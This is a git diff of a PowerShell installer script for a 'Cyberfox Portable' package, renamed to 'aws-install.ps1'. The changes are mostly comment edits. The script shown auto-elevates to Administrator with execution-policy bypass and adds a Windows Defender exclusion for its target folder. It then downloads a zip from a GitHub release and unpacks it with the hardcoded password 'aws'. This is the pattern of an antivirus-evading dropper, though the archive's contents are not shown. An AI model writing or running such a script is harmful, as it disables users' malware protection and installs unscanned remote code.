@@ -1,13 +1,13 @@
-# cyberfox-install.ps1
+# aws-install.ps1
 
-# Relaunch script as Administrator if not running elevated
+# --- Auto-elevate script if not running as Administrator ---
 if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole] "Administrator")) {
     Write-Host "Elevating script to run as Administrator..."
     Start-Process -FilePath "powershell" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
     exit
 }
 
-# Variables
+# --- Script Variables ---
 $desktopPath = [Environment]::GetFolderPath("Desktop")
 $awsFolder = Join-Path $desktopPath "AWS"
 $cyberfoxPortableFolder = Join-Path $awsFolder "Cyberfox Portable"
@@ -15,6 +15,7 @@ $url = "https://github.com/sahmsec/Cyberfox/releases/download/v1.0/CyberfoxPorta
 $zipFile = Join-Path $cyberfoxPortableFolder "CyberfoxPortable.zip"
 $password = "aws"
 
+# --- Function to locate WinRAR ---
 function Get-WinRARPath {
     $pathsToCheck = @(
         "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\WinRAR.exe",
@@ -50,6 +51,8 @@ function Get-WinRARPath {
     return $null
 }
 
+# --- Main script starts ---
+
 $winrarPath = Get-WinRARPath
 if (-not $winrarPath) {
     Write-Host "WinRAR not found. Please install it from https://www.win-rar.com/ and rerun this script." -ForegroundColor Red
@@ -57,7 +60,7 @@ if (-not $winrarPath) {
 }
 Write-Host "Found WinRAR at: $winrarPath"
 
-# Check or create AWS folder
+# Create AWS folder if needed
 if (-Not (Test-Path $awsFolder)) {
     New-Item -ItemType Directory -Path $awsFolder | Out-Null
     Write-Host "Created AWS folder: $awsFolder"
@@ -65,7 +68,7 @@ if (-Not (Test-Path $awsFolder)) {
     Write-Host "AWS folder found: $awsFolder"
 }
 
-# Check or create Cyberfox Portable folder
+# Create Cyberfox Portable folder if needed
 if (-Not (Test-Path $cyberfoxPortableFolder)) {
     New-Item -ItemType Directory -Path $cyberfoxPortableFolder | Out-Null
     Write-Host "Created Cyberfox Portable folder: $cyberfoxPortableFolder"
@@ -73,7 +76,7 @@ if (-Not (Test-Path $cyberfoxPortableFolder)) {
     Write-Host "Cyberfox Portable folder found: $cyberfoxPortableFolder"
 }
 
-# Add Defender exclusion for Cyberfox Portable folder
+# Add Defender exclusion
 try {
     $existingExclusions = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
     if ($existingExclusions -notcontains $cyberfoxPortableFolder) {
@@ -83,10 +86,10 @@ try {
         Write-Host "Defender exclusion already exists for: $cyberfoxPortableFolder"
     }
 } catch {
-    Write-Warning "Failed to add Defender exclusion."
+    Write-Warning "Failed to add Defender exclusion. Please ensure you run as Administrator."
 }
 
-# Download the zip into Cyberfox Portable folder
+# Download zip file
 Write-Host "Downloading zip..."
 try {
     Invoke-WebRequest -Uri $url -OutFile $zipFile -UseBasicParsing
@@ -96,7 +99,7 @@ try {
     exit 1
 }
 
-# Extract zip using WinRAR with password
+# Extract zip using WinRAR
 Write-Host "Extracting zip with password..."
 $extractArgs = @(
     "x",
@@ -122,7 +125,7 @@ Write-Host "Deleted zip file."
 
 Write-Host "All done! Files extracted to $cyberfoxPortableFolder"
 
-# Open Cyberfox Portable folder in File Explorer
+# Open the extracted folder in Explorer
 Start-Process explorer.exe $cyberfoxPortableFolder
 
 # Close PowerShell window if running in ConsoleHost
